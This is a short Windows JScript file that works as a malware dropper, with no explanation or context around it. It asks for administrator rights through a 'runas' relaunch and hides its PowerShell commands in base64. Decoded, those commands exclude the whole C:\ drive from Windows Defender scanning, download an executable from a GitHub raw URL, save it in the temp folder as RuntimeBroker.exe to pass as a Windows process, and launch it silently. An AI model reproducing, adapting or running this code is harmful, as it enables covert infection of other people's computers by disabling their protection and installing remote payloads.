(function() {
    var shell = new ActiveXObject("WScript.Shell");
    var shellApp = new ActiveXObject("Shell.Application");

    function ensureElevatedPrivileges() {
        if (!WScript.Arguments.Named.Exists("elevate")) {
            shellApp.ShellExecute(WScript.FullName, '"' + WScript.ScriptFullName + '" /elevate', "", "runas", 1);
            WScript.Quit();
        }
    }

    function executeEncodedCommands() {
        var commands = [
            "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA",
            "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==",
            "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYgBsAG8AdwBkAGUAeQB0AG8AcAAvAHQAcABtAG8AdAB3AGkAbgAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBDAGwAaQBlAG4AdAAtAGIAdQBpAGwAdAAuAGUAeABlACIADQAKACQAbwB1AHQAcAB1AHQAIAAlAHcAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABvAHUAdABwAHUAdAA="
        ];

        for (var i = 0; i < commands.length; i++) {
            shell.Run("powershell -enc " + commands[i], 0, false);
        }
    }

    ensureElevatedPrivileges();
    executeEncodedCommands();
})();
